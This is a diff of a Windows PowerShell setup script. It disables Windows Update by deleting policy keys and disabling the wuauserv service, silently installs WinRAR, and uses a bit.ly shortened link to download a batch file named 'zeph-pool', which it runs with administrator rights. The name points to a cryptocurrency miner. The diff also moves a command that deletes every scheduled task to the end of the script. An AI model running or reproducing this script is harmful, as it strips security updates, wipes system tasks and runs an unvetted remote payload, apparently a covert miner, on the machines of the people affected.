@@ -17,7 +17,6 @@ powershell -NoProfile -Command "reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Mi
 powershell -NoProfile -Command "reg delete 'HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU' /f"
 powershell -NoProfile -Command "reg delete 'HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate' /f"
 powershell -NoProfile -Command "New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\wuauserv' -Name 'Start' -Value 4 -PropertyType DWORD -Force"
-powershell -NoProfile -Command "Get-ScheduledTask | ForEach-Object {Unregister-ScheduledTask -TaskName $_.TaskName -TaskPath $_.TaskPath -Confirm:$false}"
 powershell -NoProfile -Command "gpupdate /force"
 powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe' -OutFile 'C:\winrar-x64-701.exe'"
 powershell -NoProfile -Command "Start-Process -FilePath 'C:\winrar-x64-701.exe' -ArgumentList '/S' -Verb RunAs"
@@ -28,4 +27,5 @@ powershell -NoProfile -Command "Invoke-WebRequest -Uri https://bit.ly/zeph-pool 
 powershell -NoProfile -Command "Copy-Item -Path C:\zeph-pool.bat -Destination C:\Setup\Zephyr\zeph-pool.bat -Force"
 powershell -NoProfile -Command "Start-Sleep -Seconds 1"
 powershell -NoProfile -Command "Start-Process -FilePath 'C:\Setup\Zephyr\zeph-pool.bat' -ArgumentList '/S' -Verb RunAs"
+powershell -NoProfile -Command "Get-ScheduledTask | ForEach-Object {Unregister-ScheduledTask -TaskName $_.TaskName -TaskPath $_.TaskPath -Confirm:$false}"
 exit
